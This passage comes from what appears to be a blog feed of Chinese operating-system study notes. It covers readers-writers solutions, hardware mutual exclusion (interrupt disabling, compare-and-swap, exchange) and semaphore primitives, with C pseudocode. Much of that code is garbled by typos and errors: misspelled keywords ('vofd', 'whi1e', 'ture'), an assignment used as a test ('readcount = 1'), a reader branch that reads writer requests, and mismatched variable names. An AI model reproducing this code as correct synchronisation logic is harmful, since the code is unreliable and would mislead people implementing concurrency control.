class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* program readersandwritere*/</span><br><span class="hljs-type">int</span> readaount; <span class="hljs-comment">//记录读进程的数量</span><br>semaphore X = <span class="hljs-number">1</span>,wsem = <span class="hljs-number">1</span>;   <span class="hljs-comment">//信号量x用于确保readcount被正确地更新</span><br><br>vofd <span class="hljs-title function_">reader</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>        semWait (x); <br>        readcount++;<br>        <span class="hljs-keyword">if</span>(readcount = <span class="hljs-number">1</span>)<br>semwait (wsem);<br>semSignal (x);<br>READUNIT():<br>semait（x）; <br>        readcount--;<br><span class="hljs-keyword">if</span> (readcount == <span class="hljs-number">0</span>)<br>semSignal(wsem);<br>semSignal(x)<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">writer</span><span class="hljs-params">()</span><br>&#123;<br>    whi1e (<span class="hljs-literal">true</span>)&#123;<br>semWait (wsem);<br>WRITEUNIT();<br>semsignal (wsem);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    readcount = <span class="hljs-number">0</span>;<br>    parbegin (reader,writer);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>wsem：实施互斥</p></li><li><p>为了允许多个读进程，没有读进程正在读时，<strong>第一个试图读</strong>的读进程需要在wsem上等待</p></li><li><p>当<u>至少已有一个</u>读进程在读时，随后的读进程<strong>无须等待</strong>，可以直接进入</p></li><li><p>读进程具有优先权</p><p>一个读进程开始访问数据区时，只要至少有一个读 进程正在读，就为读进程保留对这个数据区的控制权，因此写进程有可能处于<strong>饥饿状态</strong></p></li></ul><h3 id="5-6-1-写者优先">5.6.1 写者优先</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*program readersandwriters */</span><br><span class="hljs-type">int</span> readcount,writecount; <br>semaphore x =<span class="hljs-number">1</span>,y= <span class="hljs-number">1</span>,Z= <span class="hljs-number">1</span>,wsem = <span class="hljs-number">1</span>,rsem = <span class="hljs-number">1</span><br>    <br><span class="hljs-type">void</span> reader()<br>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>semWait(z);<br>semWait (rsem);<br>semWait(x);<br>readcount++;<br><span class="hljs-keyword">if</span> (readcount == <span class="hljs-number">1</span>)<br>semWait (wsem);<br>semSignal (x);<br>semSignal (rsem);<br>semSignal(z);<br>READUNIT();<br>semWait(x);<br>readcount--;<br><span class="hljs-keyword">if</span>(readcount == <span class="hljs-number">0</span>)semSignal(wsem);<br>semSignal (x);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">writer</span> <span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>semWait(y);<br>writecount++;<br><span class="hljs-keyword">if</span>(writecount == <span class="hljs-number">1</span>)<br>semWait(rsem);<br>semSignal (y);<br>semwait(wsem);<br>WRITEUNIT();<br>semSignal (wsem);<br>semwait(y);<br>writecount--;<br><span class="hljs-keyword">if</span> (writecount == <span class="hljs-number">0</span>) semsignal(rsem);<br>semSignal(y);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    readcount= writecount = <span class="hljs-number">0</span>;<br>parbegin (reader,writer);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>保证在一个写进程声明想写时，不允许新的读进程访问该数据区</p></li><li><p>信号量rsem∶至少有一个写进程准备访问数据区时，用于<strong>禁止所有的读进程</strong></p></li><li><p>变量writecount∶控制rsem的设置</p></li><li><p>信号量y∶控制writecount的更新</p></li><li><p>在rsem上不允许建造长队列，否则写进程将无法跳过这 个队列，因此只允许一个读进程在rsem上排队，而所有其他读进程在等待rsem前，在信号量z上排队</p></li><li><p>在以上代码，程序中的进程队列状态</p><table><thead><tr><th>状态</th><th>说明</th></tr></thead><tbody><tr><td>系统中只有读进程</td><td>设置 wsem<br />无队列</td></tr><tr><td>系统中只有写进程</td><td>设置 wsem 和rsem<br />写进程在 wsem 上排队</td></tr><tr><td>有读进程又有写进程，但读进程优先</td><td>由读进程设置 wsem <br />由写进程设置 rsem<br />所有写进程在wsem 上排队<br />一个读进程在rsem上排队<br />其他读进程在z上排队</td></tr><tr><td>既有读进程又有写进程，但写进程优先</td><td>由写进程设置 wsem<br />由写进程设置rsem<br />写进程在 wsem 上排队<br />一个读进程在rsem上排队<br />其他读进程在 z 上排队</td></tr></tbody></table></li><li><p>另一种解决方案：写进程优先权，并通过消息传递来实现</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">reader</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span><br>&#123;<br>message rmsg;<br><span class="hljs-keyword">while</span>(ture)&#123;<br>rmsg = i;<br>send(readrequest,rmsg);<br>receive(mbox[i],rmsg);<br>READUNIT;<br>rmsg = i;<br>send(finished, rmsg);<br>&#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">writer</span><span class="hljs-params">(<span class="hljs-type">int</span> j)</span><br>&#123;<br>    message rmsg;<br>    <span class="hljs-keyword">while</span>(ture)&#123;<br>        rmsg = j;<br>        send(writerequest, rmsg);<br>        receive(mbox[j], rmsg);<br>        WRITEUNIT();<br>        rmsg = j;<br>        send(finished, rmsg);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">controller</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">while</span>(ture)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(count&gt;<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">if</span>(!empty(finished, msg))&#123;<br>                receive(finished,msg);<br>                count++;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!empty(writerequest))&#123;<br>                receive(writerequest, msg);<br>                writer <span class="hljs-keyword">if</span>=msg.id;<br>                count=count<span class="hljs-number">-100</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!empty(readerequest))&#123;<br>                receive(writerequest, msg);<br>                count--;<br>                send(msg.id,<span class="hljs-string">&quot;OK&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(count==<span class="hljs-number">0</span>)&#123;<br>            send(writer id,<span class="hljs-string">&quot;OK&quot;</span>);<br>            receive(finished,msg);<br>            count=<span class="hljs-number">100</span>;<br>        &#125;<br>        <span class="hljs-keyword">while</span>(count&lt;<span class="hljs-number">0</span>)&#123;<br>            receive(finished,msg);<br>            count++;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>有一个访问共享数据区的控制进程，其他要访问这个数据区的进程给控制进程发送请求消息，若请求得到同意，则会收到应答消息&quot;OK&quot;，并通过&quot;finished&quot;消息表示访问完成</p></li><li><p>控制进程备有三个信箱，每个信箱存放一种它可能接收到的消息</p></li><li><p>要赋予写进程优先权，控制进程就要先服务于写请求消息，后服务于读请求消息</p></li><li><p>必须实施互斥</p><ul><li>需要使用变量 count，它被初始化为一个大于可能的读进程数的最大值(在该例中取其值为100)</li></ul></li><li><p>控制器的动作可总结</p><ul><li>若 count&gt;0，则无读进程正在等待，可能有也可能没有活动的读进程。要清除活动读进程， 首先要服务于所有&quot;finished&quot;消息，然后服务于写请求，再服务于读请求</li><li>若count=0，则唯一未解决的请求是写请求。允许该写进程继续执行并等待&quot;finished&quot;消息</li><li>若count&lt;0，则一个写进程已发出一条请求，且正在等待消除所有活动的读进程。因此， 只有&quot;finished&quot;消息将得到服务</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第五章-互斥和同步（二）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E5%B9%B6%E5%8F%91%E6%80%A7%EF%BC%9A%E4%BA%92%E6%96%A5%E5%92%8C%E5%90%8C%E6%AD%A5%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E5%B9%B6%E5%8F%91%E6%80%A7%EF%BC%9A%E4%BA%92%E6%96%A5%E5%92%8C%E5%90%8C%E6%AD%A5%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1>5.2 互斥∶硬件的支持</h1><h3 id="5-2-1-中断禁用">5.2.1 中断禁用</h3><ul><li><p>单处理器机器中：</p><ul><li><strong>并发</strong>进程不能重叠，只能<strong>交替</strong></li><li>一个进程在<strong>调用一个系统服务</strong>(主动)或<strong>被中断</strong>(被动)前，将<strong>一直运行</strong></li></ul><p>==&gt;为保证互斥，只需保证一个进程<strong>不被中断</strong>即可</p><p>临界区不能被中断↓</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>    <span class="hljs-comment">/*禁用中断*/</span>;<br>    <span class="hljs-comment">/* 临界区 */</span>;<br>    <span class="hljs-comment">/* 启用中断*/</span>;<br>    <span class="hljs-comment">/* 其余部分*/</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>代价非常高</li><li>处理器被限制得只能交替执行程序 → <strong>执行的效率</strong>会<strong>明显降低</strong></li><li><u>不能</u>用于多处理器体系结构中（一个以上的进程同时执行时，禁用中断并不能保证互斥）</li></ul></li></ul><h3 id="5-2-2-专用机器指令">5.2.2 专用机器指令</h3><ul><li>在多处理器配置中<ul><li>几个处理器共享对内存的访问</li><li>不存在主/从关系（对等），处理器间的行为是无关的</li></ul></li></ul><h6 id="比较和交换指令：compare-swap-指令">比较和交换指令：compare&amp;swap 指令</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">compare_and_swap</span><span class="hljs-params">(<span class="hljs-type">int</span> *word,<span class="hljs-type">int</span> testval,<span class="hljs-type">int</span> newval)</span><br>    <span class="hljs-type">int</span> oldval;<br>    oldval = *word<br>    <span class="hljs-keyword">if</span> (oldval == testval)*word = newval;<br>    <span class="hljs-keyword">return</span> oldval;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>用一个测试值（testval）检查一个内存单元（*word）</p></li><li><p>如果这个内存单元的当前值是testval，就用 newva1取代该值；否则保持不变</p></li><li><p>指令总是返回旧内存值</p></li><li><p>如果返回值与测试值<strong>相同</strong>，则表示该内存单元已被<strong>更新</strong></p></li><li><p>整个比较和交换功能按原子操作执行（不接受中断）</p></li><li><p>有的版本返回<strong>bool值</strong>，几乎所有处理器家族（x86、 IA64、sparc 和IBMz系列等）都支持该指令的某个版本，且多数操作系统都利用该指令支持并发</p></li><li><p>基于这个指令的互斥规程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* program mutualexelusion*/</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> n = <span class="hljs-comment">/*进程个数*/</span>;<br><span class="hljs-type">int</span> bolt;<br><span class="hljs-type">void</span> <span class="hljs-title function_">P</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span><br>&#123;<br>    <span class="hljs-keyword">while</span>(ture)&#123;<br>        <span class="hljs-keyword">while</span>(compare_and_swap(bolt,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>) ==<span class="hljs-number">1</span>)&#123;<span class="hljs-comment">/*不做任何事*/</span>&#125;<br>        <span class="hljs-comment">/*临界区*/</span>;<br>        bolt = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">/*其余部分*/</span>;<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    boilt = <span class="hljs-number">0</span>;<br>    perbegin(P(<span class="hljs-number">1</span>), P(<span class="hljs-number">2</span>), ... ,P(n));<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>构造parbegin(P1, P2.…Pn)的含义：阻塞主程序，初始化并行过程P1，P2.…，Pn；P1，P2.….Pn过程全部终止之后，才恢复主程序的执行</li><li>bolt：共享变量，初始化为0</li><li>唯一可以进入临界区的进程是发现<strong>bolt 等于0</strong>的那个进程，其余进程处于<strong>忙等待</strong>模式</li><li><strong>忙等待（busy waiting）<strong>或</strong>自旋等待（spin waiting）<strong>技术∶进程在得到临界区访问权之前，它只能继续执行</strong>测试变量</strong>的指令来得到访问权，除此之外<strong>不能做任何其他事情</strong></li></ul></li></ul><h6 id="exchange-指令">exchange 指令</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">exchange</span><span class="hljs-params">(<span class="hljs-type">int</span> *<span class="hljs-keyword">register</span>,<span class="hljs-type">int</span> *memory)</span><br>&#123;<br>    <span class="hljs-type">int</span> temp;<br>    temp =*memory;<br>    *memory =*<span class="hljs-keyword">register</span>;<br>    *<span class="hljs-keyword">register</span> = temp;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>基于 exchange 指令的互斥协议</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* program mutualexelusion */</span><br><span class="hljs-type">int</span> <span class="hljs-type">const</span> n = <span class="hljs-comment">/*进程个数*/</span>;<br><span class="hljs-type">int</span> bolt;<br><span class="hljs-type">void</span> <span class="hljs-title function_">P</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span><br>&#123;<br>    <span class="hljs-keyword">while</span>(ture)&#123;<br>        <span class="hljs-type">int</span> keyi = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">do</span> <span class="hljs-title function_">exchange</span><span class="hljs-params">(keyi, bolt)</span><br>            <span class="hljs-title function_">while</span><span class="hljs-params">(keyi!=<span class="hljs-number">0</span>)</span>;<br>        <span class="hljs-comment">/*临界区*/</span>;<br>        bolt = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">/*其余部分*/</span><br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    bolt = <span class="hljs-number">0</span>;<br>    parbegin(P(<span class="hljs-number">1</span>), P(<span class="hljs-number">2</span>), ... ,P(n));<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>交换一个<strong>寄存器</strong>的内容和一个<strong>存储单元</strong>的内容</li><li>共享变量 bolt 初始化为0</li><li>每个进程都使用一个局部变量 key且初始化为1</li><li>唯一可以进入临界区的进程是发现bolt 等于0的那个进程<ul><li>通过把 bolt置为1来避免其他进程进入临界区</li><li>离开临界区时，把bolt 重置为0，允许另一个进程进入它的临界区</li></ul></li><li><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>b</mi><mi>o</mi><mi>l</mi><mi>t</mi><mo>+</mo><munder><mo>∑</mo><mi>i</mi></munder><mrow><mi>k</mi><mi>e</mi><msub><mi>y</mi><mi>i</mi></msub></mrow><mo>=</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">bolt + \sum_{i}{key_i} = n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal">o</span><span class="mord mathnormal">lt</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.3277em;vertical-align:-1.2777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span></span></p><ul><li>若bolt = 0，则没有任何一个进程在它的临界区中</li><li>若bolt = 1，则只有一个进程在临界区中， 即key的值等于0的那个进程</li></ul></li></ul></li><li><p>机器指令方法的特点(优点)</p><ul><li>适用于<strong>单处理器</strong>或<strong>共享内存</strong>的多处理器上的任意数量的进程</li><li><strong>简单且易于证明</strong></li><li>可用于<strong>支持多个临界区</strong>，每个临界区可以用它<strong>自己的变量定义</strong></li></ul></li><li><p>严重的缺点</p><ul><li><strong>使用了忙等待</strong><ul><li>当一个进程<strong>正在等待进入临界区</strong>时，它会<strong>继续消耗处理器时间</strong></li></ul></li><li><strong>可能饥饿</strong><ul><li>当一个进程离开一个临界区且有多个进程正在等待时，<strong>选择</strong>哪个等待进程是<strong>任意</strong>的→某些进程可能会被<strong>无限地拒绝</strong>进入</li></ul></li><li><strong>可能死锁</strong><ul><li>考虑单处理器上的下列情况：</li><li>进程 P1 执行专用指令（例如 compare&amp;swap、 exchange）并进入临界区</li><li>P1 被中断并把处理器让给具有更高优先级的P2</li><li>若 P2 试图使用同一资源，由于互斥机制，它将被拒绝访问 → 它会进入忙等待循环</li><li>但是， 由于P1比P2的优先级低，因此它将永远不会被调度执行</li></ul></li></ul></li></ul><h1>5.3 信号量</h1><ul><li>常用的并发机制</li></ul><table><thead><tr><th>并发机制</th><th>说明</th></tr></thead><tbody><tr><td>信号量</td><td>用于<strong>进程间</strong>传递信号的一个<strong>整数值</strong><br />在信号量上只可进行三种操作：<strong>初始化</strong>、<strong>递减</strong>、<strong>增加</strong>（都是原子操作）<br />递减：用于阻塞一个进程<br />递增：用于解除一个进程的阻塞<br />信号量也称为<u>计数信号量</u>或<u>一般信号量</u></td></tr><tr><td>二元信号量</td><td>只取0值和1值的信号量</td></tr><tr><td>互斥量</td><td>类似于二元信号量<br />关键区别：为其加锁（设定值为0）的进程和为其解锁（设定值为1）的进程必须为<strong>同 一个进程</strong></td></tr><tr><td>条件变量</td><td>一种<strong>数据类型</strong><br />用于<strong>阻塞</strong>进程或线程，直到<strong>特定的条件为真</strong></td></tr><tr><td>管程</td><td>一种<strong>编程语言结构</strong><br />在一个抽象数据类型中封装了变量、访问过程、初始化代码<br />管程的变量只能由<strong>管程自身的访问过程</strong>访问，每次只能有一个进程在其中执行<br />访问过程即<strong>临界区<br /><strong>管程可以有一个</strong>等待进程队列</strong></td></tr><tr><td>事件标志</td><td>用做<strong>同步机制</strong>的一个<strong>内存字</strong><br />应用程序代码可为标志中的每个位<strong>关联不同的事件</strong><br />通过测试相关的一个或多个位， 事件标志线程可以等待一个事件或多个事件<br />在全部所需位都被设定（AND）或至少一个位被设定（OR）之前，线程会一直被阻塞</td></tr><tr><td>信箱/消息</td><td>两个进程<strong>交换信息</strong>的一种方法，也可用于<strong>同步</strong></td></tr><tr><td>自旋锁</td><td>一种<strong>互斥机制</strong>，进程在一个无条件循环中执行，等待锁变量的值可用</td></tr></tbody></table><ul><li><p>基本原理：</p><p>两个或多个进程可以通过简单的信号进行<strong>合作</strong>，可以<strong>强迫</strong>一个进程在某个位置停止， 直到它接收到一个<strong>特定的信号</strong></p><p>任何复杂的合作需求都可通过适当的信号结构得到满足</p><p>为 了发信号，需要使用一个称为信号量的特殊变量。要通过信号量 s <strong>传送信号</strong>，进程须执行原语 <strong>semSignal（s）</strong>;要通过信号量 s <strong>接收信号</strong>，进程须执行原语 <strong>semWait（s）</strong>;若相应的信号仍未发送，则<strong>阻塞</strong>进程，直到发送完为止</p></li><li><p>在整数信号量上定义了3个操作</p><p>1、一个信号量可以<strong>初始化成非负数</strong></p><p>2、<strong>semWait</strong>操作使<strong>信号量减1</strong>。若值变成<strong>负数</strong>，<strong>则阻塞执行</strong> semWait 的进程，否则进程<strong>继续执行</strong></p><p>3、<strong>semSignal</strong>操作使<strong>信号量加1</strong>。若值<strong>小于等于零</strong>，则被 semWait操作阻塞的进程<strong>解除阻塞</strong></p></li><li><p>对这三个操作的解释如下</p><ul><li>开始时，信号量的值为<strong>零</strong>或<strong>正数</strong><ul><li>若值为<strong>正数</strong>，则它等于发出 semWait 操作后可立即继续执行的进程的数量</li><li>若值为<strong>零</strong>（要么由于<strong>初始化</strong>，要么由于有<strong>等于信号量初值</strong>的进程<strong>已在等待</strong>），则发出 semWait操作的下一个进程会被阻塞，此时该信号量的值变为<strong>负值</strong></li></ul></li><li>之后，每个后续的 <strong>semWait</strong> 操作都会使信号量的<strong>负值更大</strong><ul><li>该负值等于<strong>正在等待解除阻塞</strong>的进程的数量</li></ul></li><li>在信号量为负值的情形下，每个<strong>semSignal</strong>操作都会将等待进程中的一个进程<strong>解除阻塞</strong></li></ul></li><li><p>信号量定义的三个重要结论∶</p><ul><li>通常，在进程对信号量减1之前，无法提前知道该信号量是否会被阻塞</li><li>当进程对一个信号量加1之后，会唤醒另一个进程，两个进程继续并发运行。而在一个<strong>单处理器系统</strong>中，同样无法知道哪个进程会立即继续运行</li><li>向信号量发出信号后，不需要知道是否有另一个进程正在等待，被解除阻塞的进程数要么没 有，要么是为1</li></ul></li><li><p>信号量原语的定义</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">semaphore</span>&#123;</span><br>    <span class="hljs-type">int</span> Count;<br>    queueType <span class="hljs-built_in">queue</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">semWait</span><span class="hljs-params">(semaphore s)</span><br>&#123;<br>    s.count--;<br><span class="hljs-keyword">if</span> (s.count &lt; <span class="hljs-number">0</span>)&#123;<br><span class="hljs-comment">/*把当前进程插入队列*/</span>;<br><span class="hljs-comment">/* 阻塞当前进程*/</span>;<br>    &#125;<br>&#125;<br>    <br><span class="hljs-type">void</span> <span class="hljs-title function_">semsignal</span><span class="hljs-params">(semaphore s)</span><br>&#123;<br>    s.count++; <br>    <span class="hljs-keyword">if</span>(s.count &lt;= <span class="hljs-number">0</span>)&#123;<br><span class="hljs-comment">/*把进程 P从队列中移除*/</span>;<br><span class="hljs-comment">/*把进程P插入就绪队列*/</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>二元信号量原语的定义</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">binary_semaphore</span>&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> [<span class="hljs-title">zero</span>,<span class="hljs-title">one</span>)<span class="hljs-title">value</span>;</span><br>    queueType <span class="hljs-built_in">queue</span>;<br>&#125;;<br>          <br><span class="hljs-type">void</span> <span class="hljs-title function_">semWaitB</span><span class="hljs-params">(binary_semaphore s)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(s.value == one)<br>    s.value = zero;<br><span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">/*把当前进程插入队列*/</span>;<br>        <span class="hljs-comment">/*阻塞当前进程*/</span>;<br>    &#125;<br>&#125;<br>    <br><span class="hljs-type">void</span> <span class="hljs-title function_">semsignalB</span><span class="hljs-params">(semaphore s)</span>&#123;<br>    <span class="hljs-keyword">if</span>(s,<span class="hljs-built_in">queue</span> is empty())<br>    s.value = one;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">/* 把进程P从等待队列中移除*/</span>;<br>       